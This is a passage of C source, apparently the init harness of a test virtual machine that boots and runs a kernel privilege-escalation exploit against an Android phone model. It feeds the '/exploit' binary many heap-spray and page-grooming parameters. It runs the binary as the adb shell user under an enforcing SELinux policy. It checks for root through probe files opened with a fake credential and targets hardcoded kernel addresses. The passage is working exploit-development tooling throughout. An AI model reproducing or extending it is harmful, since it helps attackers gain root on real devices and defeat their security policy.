				 * policy-free (ic_selinux must stay off). */
				p = cmdline_value("ic_scan_policy=");
				if (p && *p)
					setenv("IC_SCAN_POLICY", p, 1);
				if (cmdline_has("ic_scan_prime=1"))
					setenv("IC_SCAN_PRIME", "1", 1);
				if (cmdline_has("ic_scan_enforce=1"))
					setenv("IC_SCAN_ENFORCE", "1", 1);
				if (cmdline_has("ic_scan_inproc=1"))
					setenv("IC_SCAN_INPROC", "1", 1);
				if (cmdline_has("ic_scan_all=1"))
					setenv("IC_SCAN_ALL", "1", 1);
				p = cmdline_value("ic_scan_exec_label=");
				if (p && *p)
					setenv("IC_SCAN_EXEC_LABEL", p, 1);
				p = cmdline_value("ic_scan_ctxmap=");
				if (p && *p)
					setenv("IC_SCAN_CTXMAP", p, 1);
				p = cmdline_value("ic_scan_drop_dir=");
				if (p && *p)
					setenv("IC_SCAN_DROP_DIR", p, 1);
				if (cmdline_has("ic_drop_diag=1"))
					setenv("IC_DROP_DIAG", "1", 1);
				if (cmdline_has("ic_drop_seq=1"))
					setenv("IC_DROP_SEQ", "1", 1);
				if (cmdline_has("ic_scan_access_only=1"))
					setenv("IC_SCAN_ACCESS_ONLY", "1", 1);
				if (cmdline_has("ic_drop_mem=1"))
					setenv("IC_DROP_MEM", "1", 1);
				p = cmdline_value("ic_drop_mode=");
				if (p && *p)
					setenv("IC_DROP_MODE", p, 1);
				p = cmdline_value("ic_scan_interp=");
				if (p && *p)
					setenv("IC_SCAN_INTERP", p, 1);
				p = cmdline_value("ic_aio_test_events=");
				if (p && *p)
					setenv("IC_AIO_TEST_EVENTS", p, 1);
				/* Accept a candidate only if the payload can open a
				 * file the shell domain cannot: the probe is an
				 * apples-to-apples "more than shell" test. */
				{
					/* cmdline_value() hands back one shared
					 * static buffer, so copy the path out
					 * before the second lookup reuses it. */
					char pbuf[64];
					const char *pp =
						cmdline_value("ic_scan_probe=");
					const char *pl;

					pbuf[0] = '\0';
					if (pp && *pp)
						snprintf(pbuf, sizeof(pbuf),
							 "%s", pp);
					pl = cmdline_value(
						"ic_scan_probe_label=");
					if (pbuf[0])
						setenv("IC_SCAN_PROBE", pbuf, 1);
					if (pl && *pl)
						setenv("IC_SCAN_PROBE_LABEL", pl,
						       1);
				}
				/* Domains whose contexts the scan interns
				 * before turning enforcement on. */
				p = cmdline_value("ic_scan_ctxs=");
				if (p && *p)
					setenv("IC_SCAN_CTXS", p, 1);
				p = cmdline_value("ic_scan_access_file=");
				if (p && *p)
					setenv("IC_SCAN_ACCESS_FILE", p, 1);
			}
		} else {
			setenv("IC_REAP", "1", 1);
			setenv("IC_REAP_TARGET", target, 1);
		}
		if (!keep_root) {
			setgid(1000);
			setuid(1000);
		}
		if (cmdline_has("ic_shrink=1"))
			setenv("IC_SHRINK", "1", 1);
		if (cmdline_has("ic_reverse=1"))
			setenv("IC_REVERSE", "1", 1);
		{
			const char *k = cmdline_value("ic_kick=");

			if (k)
				setenv("IC_KICK", k, 1);
		}
		{
			const char *v = cmdline_value("ic_pc=");

			if (v)
				setenv("IC_PC", v, 1);
		}
		{
			const char *v = cmdline_value("ic_spray=");

			if (v)
				setenv("IC_SPRAY", v, 1);
		}
		{
			const char *v = cmdline_value("ic_mcast_fds=");

			if (v)
				setenv("IC_MCAST_FDS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_mcast_groups=");

			if (v)
				setenv("IC_MCAST_GROUPS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_mcast_tail=");

			if (v)
				setenv("IC_MCAST_TAIL", v, 1);
		}
		{
			const char *v = cmdline_value("ic_attempts=");

			if (v)
				setenv("IC_ATTEMPTS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pipes=");

			if (v)
				setenv("IC_PIPES", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pipe_pages=");

			if (v)
				setenv("IC_PIPE_PAGES", v, 1);
		}
		{
			const char *v = cmdline_value("ic_iorings=");

			if (v)
				setenv("IC_IORINGS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pkt_blocks=");

			if (v)
				setenv("IC_PKT_BLOCKS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pkt_block=");

			if (v)
				setenv("IC_PKT_BLOCK", v, 1);
		}
		if (cmdline_has("ic_skbf=1"))
			setenv("IC_SKBF", "1", 1);
		if (cmdline_has("ic_peasksbf=1"))
			setenv("IC_PEAK_SKBF", "1", 1);
		if (cmdline_has("ic_inpage=1"))
			setenv("IC_INPAGE", "1", 1);
		if (cmdline_has("ic_allocdbg=1"))
			setenv("IC_ALLOCDBG", "1", 1);
		if (cmdline_has("ic_keep_pool=1"))
			setenv("IC_KEEP_POOL", "1", 1);
		{
			const char *v = cmdline_value("ic_attempt_wait=");

			if (v)
				setenv("IC_ATTEMPT_WAIT", v, 1);
		}
		if (cmdline_has("ic_pfndbg=1"))
			setenv("IC_PFNDBG", "1", 1);
		if (cmdline_has("ic_pageprobe=1"))
			setenv("IC_PAGEPROBE", "1", 1);
		if (cmdline_has("ic_ptzone=1"))
			setenv("IC_PTZONE", "1", 1);
		if (cmdline_has("ic_ptvec=1"))
			setenv("IC_PTVEC", "1", 1);
		{
			const char *v = cmdline_value("ic_pp_anon=");

			if (v)
				setenv("IC_PP_ANON", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_pte=");

			if (v)
				setenv("IC_PP_PTE", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_step=");

			if (v)
				setenv("IC_PP_STEP", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_skb_n=");

			if (v)
				setenv("IC_PP_SKB_N", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_skb_pairs=");

			if (v)
				setenv("IC_PP_SKB_PAIRS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_skb_payload=");

			if (v)
				setenv("IC_PP_SKB_PAYLOAD", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_skb_step=");

			if (v)
				setenv("IC_PP_SKB_STEP", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_aio_events=");

			if (v)
				setenv("IC_PP_AIO_EVENTS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_aio_ctxs=");

			if (v)
				setenv("IC_PP_AIO_CTXS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_perf_events=");

			if (v)
				setenv("IC_PP_PERF_EVENTS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_perf_pages=");

			if (v)
				setenv("IC_PP_PERF_PAGES", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_pkt_blocks=");

			if (v)
				setenv("IC_PP_PKT_BLOCKS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_pipes=");

			if (v)
				setenv("IC_PP_PIPES", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_pipe_pages=");

			if (v)
				setenv("IC_PP_PIPE_PAGES", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_pkt_bsize=");

			if (v)
				setenv("IC_PP_PKT_BSIZE", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_uring_n=");

			if (v)
				setenv("IC_PP_URING_N", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pp_uring_entries=");

			if (v)
				setenv("IC_PP_URING_ENTRIES", v, 1);
		}
		if (cmdline_has("ic_pt_flush=1"))
			setenv("IC_PT_FLUSH", "1", 1);
		{
			const char *v = cmdline_value("ic_skb_socks=");

			if (v)
				setenv("IC_SKB_SOCKS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_skb_payload=");

			if (v)
				setenv("IC_SKB_PAYLOAD", v, 1);
		}
		{
			const char *v = cmdline_value("ic_cpu=");

			if (v)
				setenv("IC_CPU", v, 1);
		}
		{
			const char *v = cmdline_value("ic_peak_workers=");

			if (v)
				setenv("IC_PEAK_WORKERS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_aio_events=");

			if (v)
				setenv("IC_AIO_EVENTS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_aio_ctxs=");

			if (v)
				setenv("IC_AIO_CTXS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_perf_events=");

			if (v)
				setenv("IC_PERF_EVENTS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_perf_warm=");

			if (v)
				setenv("IC_PERF_WARM", v, 1);
		}
		{
			const char *v = cmdline_value("ic_perf_hold=");

			if (v)
				setenv("IC_PERF_HOLD", v, 1);
		}
		{
			const char *v = cmdline_value("ic_perf_eat=");

			if (v)
				setenv("IC_PERF_EAT", v, 1);
		}
		{
			const char *v = cmdline_value("ic_spray_diag=");

			if (v)
				setenv("IC_SPRAY_DIAG", v, 1);
		}
		if (cmdline_has("ic_perf_fixed=1"))
			setenv("IC_PERF_FIXED", "1", 1);
		{
			const char *v = cmdline_value("ic_pad_keep=");

			if (v)
				setenv("IC_PAD_KEEP", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pad_skip=");

			if (v)
				setenv("IC_PAD_SKIP", v, 1);
		}
		{
			const char *v = cmdline_value("ic_flush_del=");

			if (v)
				setenv("IC_FLUSH_DEL", v, 1);
		}
		{
			const char *v = cmdline_value("ic_flush_sparse=");

			if (v)
				setenv("IC_FLUSH_SPARSE", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pool_tail_pre=");

			if (v)
				setenv("IC_POOL_TAIL_PRE", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pool_tail_post=");

			if (v)
				setenv("IC_POOL_TAIL_POST", v, 1);
		}
		{
			const char *v = cmdline_value("ic_pushers=");

			if (v)
				setenv("IC_PUSHERS", v, 1);
		}
		{
			const char *v = cmdline_value("ic_free_grace=");

			if (v)
				setenv("IC_FREE_GRACE", v, 1);
		}
		{
			const char *v = cmdline_value("ic_perf_vma_warm=");

			if (v)
				setenv("IC_PERF_VMA_WARM", v, 1);
		}
		{
			const char *v = cmdline_value("ic_perf_vma_keep=");

			if (v)
				setenv("IC_PERF_VMA_KEEP", v, 1);
		}
		{
			const char *v = cmdline_value("ic_anon_pages=");

			if (v)
				setenv("IC_ANON_PAGES", v, 1);
		}
		{
			const char *v = cmdline_value("ic_aio_maxnr=");

			if (v)
				setenv("IC_AIO_MAXNR", v, 1);
		}
		if (cmdline_has("ic_dumppt=1"))
			setenv("IC_DUMPPT", "1", 1);
		{
			const char *v = cmdline_value("ic_prewarm_partial=");

			if (v)
				setenv("IC_PREWARM_PARTIAL", v, 1);
		}
		{
			const char *v = cmdline_value("ic_prewarm_keep=");

			if (v)
				setenv("IC_PREWARM_KEEP", v, 1);
		}
		{
			const char *v = cmdline_value("ic_slab_minpartial=");

			if (v)
				setenv("IC_SLAB_MINPARTIAL", v, 1);
		}
		{
			const char *v = cmdline_value("ic_slab_cpupartial=");

			if (v)
				setenv("IC_SLAB_CPUPARTIAL", v, 1);
		}
		if (cmdline_has("ic_aio_noremap=1"))
			setenv("IC_AIO_NOREMAP", "1", 1);
		if (cmdline_has("ic_aio_nofault=1"))
			setenv("IC_AIO_NOFAULT", "1", 1);
		{
			const char *v = cmdline_value("ic_vma_prewarm=");

			if (v)
				setenv("IC_VMA_PREWARM", v, 1);
		}
		{
			const char *v = cmdline_value("ic_vma_keep=");

			if (v)
				setenv("IC_VMA_KEEP", v, 1);
		}
		{
			const char *v = cmdline_value("ic_filp_shield=");

			if (v)
				setenv("IC_FILP_SHIELD", v, 1);
		}
		{
			const char *v = cmdline_value("ic_km64_shield=");

			if (v)
				setenv("IC_KM64_SHIELD", v, 1);
		}
		{
			const char *v = cmdline_value("ic_spraydbg=");

			if (v)
				setenv("IC_SPRAYDBG", v, 1);
		}
		if (cmdline_has("ic_aio_probe=1"))
			setenv("IC_AIO_PROBE", "1", 1);
		{
			const char *v = cmdline_value("ic_staging_dir=");

			if (v)
				setenv("IC_STAGING_DIR", v, 1);
		}
		if (cmdline_has("ic_peak_diag=1"))
			setenv("IC_PEAK_DIAG", "1", 1);
		execl("/exploit", "exploit", (char *)NULL);
		_exit(1);
	}
	if (p < 0) {
		printf("[init] fork failed\n");
		fflush(stdout);
		return;
	}
	waitpid(p, &st, 0);
	printf("[init] exploit target=%s status=0x%x\n", target, st);
	fflush(stdout);
}

/* ------------------------------------------------------------------
 * Faithful adb-shell run: the exploit runs as uid 2000 in u:r:shell:s0,
 * the way the phone program will run, with the firmware's policy
 * enforced for the whole chain.  The harness starts in the kernel
 * domain and is the only thing that can turn enforcement back off, so
 * the handshake is: child signals readiness while permissive, parent
 * enforces, waits, un-enforces, then dumps the child's log.
 * ------------------------------------------------------------------ */

#define SEL_ADB_FILE	"u:object_r:adb_data_file:s0"
#define SHELLBOOT_DIR	"/tmp/ic-work"
#define SHELLBOOT_LOG	"/tmp/ic-work/log"
#define SHELLBOOT_BIN	"/tmp/ic-shell-boot"
#define SHELLBOOT_DROP	"/tmp/ic-dropdir"

static void shellboot_label(const char *path, const char *label)
{
	int rc = setxattr(path, "security.selinux", label, strlen(label) + 1, 0);

	printf("[boot] label %s=%s rc=%d errno=%d\n", path, label, rc,
	       rc ? errno : 0);
}

static void shellboot_prepare(void)
{
	int fd, e;

	mkdir(SHELLBOOT_DIR, 0777);
	chmod(SHELLBOOT_DIR, 0777);
	mkdir(SHELLBOOT_DROP, 0777);
	chmod(SHELLBOOT_DROP, 0777);
	/* Same shape as /data/local/tmp: world-traversable, the payload
	 * owned by the shell uid, no setuid bit (the tmpfs is nosuid). */
	e = copy_file("/exploit", SHELLBOOT_BIN, 0755, 2000);
	printf("[boot] copy payload rc=%d errno=%d\n", e, e ? errno : 0);
	fd = open(SHELLBOOT_LOG, O_CREAT | O_WRONLY | O_TRUNC | O_CLOEXEC,
		  0666);
	if (fd >= 0) {
		(void)write(fd, "shellboot start\n", 16);
		close(fd);
		(void)chown(SHELLBOOT_LOG, 2000, 2000);
		(void)chmod(SHELLBOOT_LOG, 0666);
	} else {
		printf("[boot] log create errno=%d\n", errno);
	}
	shellboot_label(SHELLBOOT_DIR, SEL_DATA);
	shellboot_label(SHELLBOOT_BIN, SEL_DATA);
	shellboot_label(SHELLBOOT_LOG, SEL_DATA);
	shellboot_label(SHELLBOOT_DROP, SEL_ADB_FILE);
}

static void shellboot_child(int wfd)
{
	char *envp[32];
	char spray[80], filp[80], km64[80], cwait[80], stage[96];
	char ctxs[80], vma[80];
	const char *v;
	unsigned int n = 0;
	char r = 'R';
	int logfd, e;

	e = write_str_file("/proc/self/attr/current", SEL_SHELL);
	if (e)
		printf("[boot] setcon shell rc=%d\n", e);
	(void)setgroups(0, NULL);
	(void)setgid(2000);
	(void)setuid(2000);
	logfd = open(SHELLBOOT_LOG, O_WRONLY | O_APPEND);
	if (logfd >= 0) {
		(void)dup2(logfd, 1);
		(void)dup2(logfd, 2);
		if (logfd > 2)
			close(logfd);
	}
	/* Nobody is enforcing yet: the parent can read this and then flip
	 * the switch, so the exec happens with the policy live. */
	(void)write(wfd, &r, 1);
	close(wfd);
	sleep(2);

	v = cmdline_value("ic_shellboot_spray=");
	snprintf(spray, sizeof(spray), "IC_SPRAY=%s",
		 v && *v ? v : "aio");
	v = cmdline_value("ic_shellboot_filp=");
	snprintf(filp, sizeof(filp), "IC_FILP_SHIELD=%s",
		 v && *v ? v : "18000");
	v = cmdline_value("ic_shellboot_km64=");
	snprintf(km64, sizeof(km64), "IC_KM64_SHIELD=%s",
		 v && *v ? v : "4096");
	v = cmdline_value("ic_shellboot_wait=");
	snprintf(cwait, sizeof(cwait), "IC_ATTEMPT_WAIT=%s",
		 v && *v ? v : "600");
	v = cmdline_value("ic_shellboot_ctxs=");
	snprintf(ctxs, sizeof(ctxs), "IC_AIO_CTXS=%s",
		 v && *v ? v : "16384");
	v = cmdline_value("ic_shellboot_vma=");
	snprintf(vma, sizeof(vma), "IC_VMA_PREWARM=%s",
		 v && *v ? v : "16384");
	snprintf(stage, sizeof(stage), "IC_STAGING_DIR=%s", SHELLBOOT_DIR);
	envp[n++] = "PATH=/sbin:/system/bin:/system/xbin";
	envp[n++] = "IC_PEAK=1";
	envp[n++] = "IC_FORK=1";
	envp[n++] = "IC_REVERSE=1";
	envp[n++] = "IC_PC=0";
	envp[n++] = "IC_PEAK_SKBF=1";
	envp[n++] = "IC_KEEP_POOL=1";
	/* The spray only reclaims X's slab if nothing else pulls a page from the
	 * buddy between the two ring pages that split the discarded order-1 block.
	 * Faulting a ring mapping mid-spray allocates a page-table page from the
	 * same drained pcp FIFO, and the anon spray lazily faults 16384 PTE pages
	 * for the same reason, so keep both out of the shellboot run too. */
	envp[n++] = "IC_AIO_NOFAULT=1";
	envp[n++] = "IC_AIO_NOREMAP=1";
	envp[n++] = "IC_ANON_PAGES=0";
	envp[n++] = "IC_AIO_EVENTS=1";
	envp[n++] = "IC_VMA_KEEP=10";
	envp[n++] = ctxs;
	envp[n++] = vma;
	envp[n++] = stage;
	envp[n++] = spray;
	envp[n++] = filp;
	envp[n++] = km64;
	envp[n++] = cwait;
	envp[n] = NULL;
	execve(SHELLBOOT_BIN, (char *const[]){ "exploit", NULL }, envp);
	e = errno;
	(void)write(1, "exec failed\n", 12);
	_exit(e ? e : 1);
}

static void shellboot_dump_log(void)
{
	char b[4096];
	ssize_t n;
	int fd = open(SHELLBOOT_LOG, O_RDONLY | O_CLOEXEC);

	printf("[boot] ---- shell log ----\n");
	if (fd < 0) {
		printf("[boot] log open errno=%d\n", errno);
		printf("[boot] ---- end shell log ----\n");
		return;
	}
	while ((n = read(fd, b, sizeof(b))) > 0)
		(void)write(1, b, (size_t)n);
	close(fd);
	printf("\n[boot] ---- end shell log ----\n");
}

static void shellboot_test(void)
{
	int up[2];
	pid_t p;
	int st = 0, on_rc, off_rc;
	unsigned long waited = 0;
	char c = 0;

	shellboot_prepare();
	if (pipe(up)) {
		printf("[boot] pipe errno=%d\n", errno);
		return;
	}
	p = fork();
	if (p == 0) {
		close(up[0]);
		shellboot_child(up[1]);
		_exit(1);
	}
	if (p < 0) {
		printf("[boot] fork errno=%d\n", errno);
		return;
	}
	close(up[1]);
	if (read(up[0], &c, 1) != 1)
		printf("[boot] handshake read errno=%d\n", errno);
	close(up[0]);
	printf("[boot] pid=%d handshake='%c' enforcing\n", (int)p, c);
	fflush(stdout);
	on_rc = write_str_file("/sys/fs/selinux/enforce", "1");
	/* No console output until enforcement is off again: the kernel
	 * domain is under the policy too, and a denied console write would
	 * only add noise to the AVC stream.  The child logs to its file. */
	while (waited < 3000) {
		pid_t r = waitpid(p, &st, WNOHANG);

		if (r == p)
			break;
		sleep_ms(100);
		waited++;
	}
	off_rc = write_str_file("/sys/fs/selinux/enforce", "0");
	printf("[boot] enforce on=%d off=%d waited=%lums\n", on_rc, off_rc,
	       waited * 100);
	if (waited >= 3000) {
		printf("[boot] timeout; killing pid=%d\n", (int)p);
		kill(p, SIGKILL);
		(void)waitpid(p, &st, 0);
	} else {
		printf("[boot] child status=0x%x\n", st);
	}
	fflush(stdout);
	shellboot_dump_log();
}

int main(void)
{
	mkdir("/proc", 0755);
	mkdir("/sys", 0755);
	mkdir("/dev", 0755);
	mkdir("/tmp", 0777);
	mount("proc", "/proc", "proc", 0, NULL);
	mount("sysfs", "/sys", "sysfs", 0, NULL);
	mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);
	/* nosuid models the device mounts; the fork path must work without
	 * any setuid bit on the payload.  MS_NOSUID is a mount flag, not a
	 * tmpfs data option. */
	mount("tmpfs", "/tmp", "tmpfs", MS_NOSUID, "mode=1777,size=512M");
	/* AVC denials are the only channel left once the policy is enforcing
	 * (no domain here may write the console), so stop printk from
	 * rate-limiting the audit stream away. */
	write_str_file("/proc/sys/kernel/printk_ratelimit", "0");
	write_str_file("/proc/sys/kernel/printk_ratelimit_burst", "100000");
	chmod("/exploit", 0755);
	/* Probe files for the fork path: the fake cred's fsuid is 0, so the
	 * 0400 root-owned file must open (DAC owner) and the 0600 uid-1000
	 * file must be denied after walking the fake group_info. */
	{
		int fd = open("/ic-proof-root", O_CREAT | O_WRONLY | O_TRUNC, 0600);

		if (fd >= 0) {
			(void)write(fd, "R", 1);
			close(fd);
			chmod("/ic-proof-root", 0400);
		}
		fd = open("/ic-proof-shell", O_CREAT | O_WRONLY | O_TRUNC, 0600);
		if (fd >= 0) {
			(void)write(fd, "S", 1);
			close(fd);
			chown("/ic-proof-shell", 1000, 1000);
			chmod("/ic-proof-shell", 0600);
		}
		/* The scan's privilege probe: root-owned 0600 on the nosuid
		 * tmpfs, so DAC always lets the fake cred's fsuid 0 through
		 * and only the file's SELinux label decides. */
		fd = open("/tmp/ic-probe-file", O_CREAT | O_WRONLY | O_TRUNC,
			  0600);
		if (fd >= 0) {
			(void)write(fd, "P", 1);
			close(fd);
			chmod("/tmp/ic-probe-file", 0600);
		}
	}
	/* Plain 0755 copies on the nosuid tmpfs: one is the fork child's
	 * payload, the others are SELinux exec probes that get relabelled
	 * once the real policy is loaded. */
	copy_file("/exploit", "/tmp/ic-exec-helper", 0755, 1000);
	/* Stand-in for /system/bin/sh in the shebang-exec test: a second
	 * copy of the image that the exploit relabels system_file. */
	copy_file("/exploit", "/tmp/ic-interp", 0755, 0);
	copy_file("/sel-exec", "/tmp/sel-exec", 0755, 0);
	copy_file("/sel-exec", "/tmp/sel-system", 0755, 0);

	/* Model the PD2506 shell/app limits: RLIMIT_NOFILE is 32768 and
	 * perf_event_paranoid is -1 (vendor value).  The perf user_page
	 * spray opens one fd per page and, in app mode, must not trip the
	 * paranoid RLIMIT_MEMLOCK check in perf_mmap(). */
	{
		struct rlimit rl = { 32768, 32768 };

		(void)setrlimit(RLIMIT_NOFILE, &rl);
	}
	if (cmdline_has("ic_perf_paranoid=")) {
		const char *v = cmdline_value("ic_perf_paranoid=");

		if (v)
			write_str_file("/proc/sys/kernel/perf_event_paranoid", v);
	}
	if (cmdline_has("ic_antifrag="))
		antifrag_probe();
	printf("\n*** REAP INIT ***\n");
	fflush(stdout);

	print_boot_id("pre ");
	print_syms();
	if (cmdline_has("ic_tracefs=")) {
		const char *v = cmdline_value("ic_tracefs=");

		tracefs_probe(v && atoi(v) >= 2);
		print_boot_id("post");
		sync();
		reboot(RB_POWER_OFF);
		return 0;
	}
	if (cmdline_has("ic_ptdump=1")) {
		dump_pagetype();
		sync();
		reboot(RB_POWER_OFF);
		return 0;
	}
	if (cmdline_has("ic_delay_ms=")) {
		const char *d = cmdline_value("ic_delay_ms=");

		if (d) {
			unsigned long ms = strtoul(d, NULL, 0);

			printf("[init] delay %lu ms\n", ms);
			fflush(stdout);
			sleep_ms(ms);
		}
	}
	if (cmdline_has("ic_selinux=1")) {
		selinux_init();
		if (cmdline_has("ic_sexec=1")) {
			selinux_exec_test("/tmp/sel-exec");
			selinux_exec_test("/tmp/sel-system");
		}
		if (cmdline_has("ic_shellboot=1")) {
			shellboot_test();
			print_boot_id("boot");
			sync();
			reboot(RB_POWER_OFF);
			return 0;
		}
	}
	if (cmdline_has("ic_noexploit=1")) {
		print_boot_id("post");
		sync();
		reboot(RB_POWER_OFF);
		return 0;
	}
	{
		const char *only = cmdline_value("ic_target=");

		if (only && !strcmp(only, "oracle")) {
			char buf[32];
			unsigned long long a = sym_addr("sysctl_bootid");

			if (a) {
				snprintf(buf, sizeof(buf), "0x%llx", a + 8);
				printf("[init] oracle target %s\n", buf);
				fflush(stdout);
				run_exploit(buf);
				print_boot_id("step");
			} else {
				printf("[init] oracle symbol not found\n");
				fflush(stdout);
			}
		} else if (only) {
			run_exploit(only);
		} else {
			run_exploit("0");
			run_exploit("0xffffff800267eed8");
		}
	}
	print_boot_id("post");

	sync();
	reboot(RB_POWER_OFF);
	return 0;
}
